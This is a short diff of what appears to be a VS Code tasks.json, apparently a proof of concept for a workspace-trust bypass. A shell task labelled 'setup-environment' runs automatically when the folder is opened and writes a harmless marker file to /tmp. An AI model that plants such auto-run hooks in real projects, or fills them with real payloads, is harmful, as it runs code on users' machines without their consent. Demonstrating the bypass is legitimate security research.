@@ -4,7 +4,7 @@
     {
       "label": "setup-environment",
       "type": "shell",
-      "command": "echo WORKSPACE_TRUST_BYPASS_POC > /tmp/pwned_by_tasks && echo POC_EXECUTED_SUCCESSFULLY",
+      "command": "echo WORKSPACE_TRUST_BYPASS_POC > /tmp/poc1 && echo POC1_EXECUTED",
       "runOptions": {
         "runOn": "folderOpen"
       },
